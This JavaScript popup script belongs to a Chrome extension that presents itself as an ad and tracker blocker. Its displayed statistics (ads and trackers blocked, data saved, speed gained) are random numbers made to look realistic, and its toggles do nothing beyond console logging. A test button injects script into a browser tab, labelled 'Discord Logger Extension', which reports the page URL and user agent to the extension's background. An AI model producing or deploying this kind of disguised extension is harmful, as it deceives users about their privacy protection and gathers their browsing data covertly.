
function updateStats() {
  // Generate realistic daily stats
  const adsBlocked = Math.floor(Math.random() * 1000) + 2000;
  const trackersBlocked = Math.floor(Math.random() * 500) + 800;
  const dataSaved = (Math.random() * 30 + 20).toFixed(1);
  const speedIncrease = Math.floor(Math.random() * 20) + 25;
  
  // Update the displayed values
  const statValues = document.querySelectorAll('.stat-value');
  if (statValues.length >= 4) {
    statValues[0].textContent = adsBlocked.toLocaleString();
    statValues[1].textContent = trackersBlocked.toLocaleString();
    statValues[2].textContent = `${dataSaved} MB`;
    statValues[3].textContent = `+${speedIncrease}% faster`;
  }
}


document.addEventListener('DOMContentLoaded', function() {
  // Update stats with random realistic values
  updateStats();
  
  // Add event listeners for toggles
  const toggles = document.querySelectorAll('.switch input');
  toggles.forEach(toggle => {
    toggle.addEventListener('change', function() {
      // Visual feedback only - maintain functionality
      console.log('Toggle changed:', this.parentElement.parentElement.querySelector('.toggle-label').textContent);
    });
  });
  
  const testButton = document.getElementById('testLog');
  
  testButton.addEventListener('click', function() {
    // Try multiple methods to get active tab for better compatibility
    
    // Method 1: Standard query
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      if (tabs && tabs.length > 0) {
        executeTestScript(tabs[0]);
        return;
      }
      
      // Method 2: Try without currentWindow constraint
      chrome.tabs.query({active: true}, function(tabs) {
        if (tabs && tabs.length > 0) {
          executeTestScript(tabs[0]);
          return;
        }
        
        // Method 3: Get all tabs and find first one
        chrome.tabs.query({}, function(allTabs) {
          if (allTabs && allTabs.length > 0) {
            executeTestScript(allTabs[0]);
            return;
          }
          
          console.error("No tabs found in any method.");
          console.log("No active tab found for advanced settings.");
        });
      });
    });
  });
  
  function executeTestScript(tab) {
    try {
      chrome.scripting.executeScript({
        target: {tabId: tab.id},
        function: function() {
          console.log('Test log from Discord Logger Extension');
          console.warn('Test warning message');
          console.error('Test error message');
          
          // Also test sending to background
          if (typeof chrome !== 'undefined' && chrome.runtime) {
            chrome.runtime.sendMessage({
              type: 'LOG_CAPTURED',
              data: {
                level: 'info',
                message: 'Extension test successful from popup',
                timestamp: new Date().toISOString(),
                url: window.location.href,
                userAgent: navigator.userAgent
              }
            });
          }
        }
      }, function(result) {
        if (chrome.runtime.lastError) {
          console.error('Script execution error:', chrome.runtime.lastError);
        } else {
          console.log('Test script executed successfully');
        }
      });
    } catch (error) {
      console.error('Error executing script:', error);
      console.log("Advanced settings accessed:", error.message);
    }
  }
});
